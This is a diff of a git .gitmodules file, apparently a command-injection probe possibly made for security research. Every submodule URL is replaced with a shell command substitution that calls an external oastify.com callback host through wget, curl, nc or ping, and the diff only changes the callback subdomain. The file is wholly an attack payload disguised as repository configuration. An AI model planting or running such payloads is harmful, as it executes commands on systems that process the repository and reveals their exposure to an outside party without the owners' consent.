@@ -1,15 +1,15 @@
 [submodule "sp"]
 	path = sp
-	url = '$(wget https://sp.ebt546hxscnzni3wo4gb0vr16scj0ood.oastify.com/snykpeak)'.git
+	url = '$(wget https://sp.7iqvj8ud1sk07g9axwtps6i3wu2lqnec.oastify.com/snykpeak)'.git
 
 [submodule "curl"]
 	path = curl
-	url = '$(curl https://curl.ebt546hxscnzni3wo4gb0vr16scj0ood.oastify.com/snykpeak)'.git
+	url = '$(curl https://curl.7iqvj8ud1sk07g9axwtps6i3wu2lqnec.oastify.com/snykpeak)'.git
 
 [submodule "nc"]
 	path = nc
-	url = '$(nc nc.ebt546hxscnzni3wo4gb0vr16scj0ood.oastify.com 3000)'.git
+	url = '$(nc nc.7iqvj8ud1sk07g9axwtps6i3wu2lqnec.oastify.com 3000)'.git
 
 [submodule "ping"]
 	path = ping
-	url = '$(ping ping.ebt546hxscnzni3wo4gb0vr16scj0ood.oastify.com)'.git
+	url = '$(ping ping.7iqvj8ud1sk07g9axwtps6i3wu2lqnec.oastify.com)'.git
